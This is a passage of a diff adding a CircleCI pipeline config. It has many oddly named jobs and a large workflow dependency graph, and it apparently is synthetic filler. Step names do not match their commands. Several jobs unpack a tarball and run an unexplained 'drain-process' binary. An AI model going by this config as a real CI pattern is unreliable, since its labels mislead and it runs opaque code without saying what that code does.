+            ls /tmp/pool-delta/8OQh9bj > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - '8OQh9bj'
+  rl-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/ZjCw57FvY 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  RD-FLAG-9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: training serving endpoint
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; diff <(echo 'water the plants') <(echo 'x y z') || echo different; true ; } > /tmp/pool-delta/worker937
+            ls /tmp/pool-delta/worker937 > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'worker937'
+  Build_Prod2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/worker937 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  chAlphaMulti:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Quickly hot swap the solar inverter
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; df -hT | sort -n --key=5 | tr -s ' '; true ; } > /tmp/pool-delta/build_40410
+            ls /tmp/pool-delta/build_40410 > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'build_40410'
+  q4-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/build_40410 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  CPU_OK:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: LINE 028
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; if [ -x /usr/bin/awk ]; then echo true; fi; true ; } > /tmp/pool-delta/CRISP_THETA_MOTH_CRISP
+            ls /tmp/pool-delta/CRISP_THETA_MOTH_CRISP > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'CRISP_THETA_MOTH_CRISP'
+  tweak-webhook-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/CRISP_THETA_MOTH_CRISP 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+
+workflows:
+  pipeline:
+    jobs:
+      - product-7x
+      - do-the-thing:
+          requires:
+            - product-7x
+      - lenName:
+          requires:
+            - product-7x
+      - go1-21-vet:
+          requires:
+            - lenName
+      - atlasatlas:
+          requires:
+            - lenName
+      - add-edge:
+          requires:
+            - atlasatlas
+      - accentSmoke:
+          requires:
+            - atlasatlas
+      - produce-production-release-candidate:
+          requires:
+            - accentSmoke
+      - RD-FLAG-9:
+          requires:
+            - accentSmoke
+      - Build_Prod2:
+          requires:
+            - RD-FLAG-9
+      - expect_bundle_smart
+      - DRGHT
+      - pancake-byte-provider
+      - vega-beta:
+          requires:
+            - expect_bundle_smart
+            - DRGHT
+            - pancake-byte-provider
+      - rl-v2:
+          requires:
+            - expect_bundle_smart
+            - DRGHT
+            - pancake-byte-provider
+      - LAB_DEPLOY_4:
+          requires:
+            - expect_bundle_smart
+            - DRGHT
+            - pancake-byte-provider
+      - chore-5016:
+          requires:
+            - expect_bundle_smart
+            - DRGHT
+            - pancake-byte-provider
+      - p-2a:
+          requires:
+            - expect_bundle_smart
+            - DRGHT
+            - pancake-byte-provider
+      - dotnet8-bench:
+          requires:
+            - expect_bundle_smart
+            - DRGHT
+            - pancake-byte-provider
+      - publish:
+          requires:
+            - expect_bundle_smart
+            - DRGHT
+            - pancake-byte-provider
+      - raj-verify:
+          requires:
+            - expect_bundle_smart
+            - DRGHT
+            - pancake-byte-provider
+      - lets-go:
+          requires:
+            - expect_bundle_smart
+            - DRGHT
+            - pancake-byte-provider
+      - CPU_OK
+      - kernelType
+      - border-ash
+      - tweak-webhook-reload:
+          requires:
+            - CPU_OK
+            - kernelType
+            - border-ash
+      - UAT_VERIFY_5:
+          requires:
+            - CPU_OK
+            - kernelType
+            - border-ash
+      - q4-release:
+          requires:
+            - CPU_OK
+            - kernelType
+            - border-ash
+      - cf-2:
+          requires:
+            - CPU_OK
+            - kernelType
+            - border-ash
+      - Validate_Service6:
+          requires:
+            - CPU_OK
+            - kernelType
+            - border-ash
+      - shippit:
+          requires:
+            - CPU_OK
+            - kernelType
+            - border-ash
+      - chAlphaMulti
+      - bridgeBuf
+      - dcb5dc28-e096-6
+      - q4-ship:
+          requires:
+            - chAlphaMulti
+            - bridgeBuf
+            - dcb5dc28-e096-6
+      - INFRA-553:
+          requires:
+            - chAlphaMulti
+            - bridgeBuf
+            - dcb5dc28-e096-6
+      - orion-ng:
+          requires:
+            - chAlphaMulti
+            - bridgeBuf
+            - dcb5dc28-e096-6
+      - Ship_Tests7:
+          requires:
+            - chAlphaMulti
+            - bridgeBuf
+            - dcb5dc28-e096-6
+      - nightly-v3:
+          requires:
+            - chAlphaMulti
+            - bridgeBuf
+            - dcb5dc28-e096-6
+      - assemble-staging-release-candidate:
+          requires:
+            - chAlphaMulti
+            - bridgeBuf
+            - dcb5dc28-e096-6
+      - bake-it:
+          requires:
+            - chAlphaMulti
+            - bridgeBuf
+            - dcb5dc28-e096-6
+      - q2-ship:
+          requires:
+            - chAlphaMulti
+            - bridgeBuf
+            - dcb5dc28-e096-6
+      - RUN_PROD:
+          requires:
+            - chAlphaMulti
+            - bridgeBuf
+            - dcb5dc28-e096-6
+      - build:
+          requires:
+            - chAlphaMulti
+            - bridgeBuf
+            - dcb5dc28-e096-6
